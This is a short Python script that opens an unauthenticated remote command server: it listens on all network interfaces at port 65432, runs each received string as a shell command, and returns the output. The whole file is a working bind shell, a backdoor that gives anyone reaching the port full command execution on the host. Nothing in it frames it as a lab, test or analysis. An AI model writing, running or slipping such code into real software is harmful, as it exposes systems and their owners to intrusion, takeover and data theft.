import socket, subprocess, threading

def handle_client(conn, addr):
    print(f"[NEW] {addr}")
    while True:
        cmd = conn.recv(1024).decode()
        if not cmd or cmd.lower() == "exit":
            break
        try:
            output = subprocess.getoutput(cmd)
            conn.send(output.encode())
        except Exception as e:
            conn.send(f"Error: {e}".encode())
    conn.close()

server = socket.socket()
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

server.bind(("0.0.0.0", 65432))
server.listen()
print("Remote command server started...")

while True:
    conn, addr = server.accept()
    threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()


